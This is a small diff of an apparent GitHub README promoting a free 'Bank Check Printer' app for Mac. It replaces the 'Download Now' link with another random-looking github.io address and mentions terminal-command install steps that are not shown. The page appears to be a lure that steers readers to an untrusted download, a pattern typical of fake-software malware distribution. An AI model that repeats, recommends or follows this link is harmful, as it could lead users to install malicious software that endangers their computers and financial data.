@@ -3,7 +3,7 @@
 
 Effortlessly print professional bank checks on your Mac with *Bank Check Printer*. Follow the step-by-step instructions below to install this powerful tool for free and streamline your financial tasks.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/bankcheckprinter)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/bankcheckprinter)
 
 If the download button above doesn't work, follow the terminal command instructions below for a seamless installation.
 
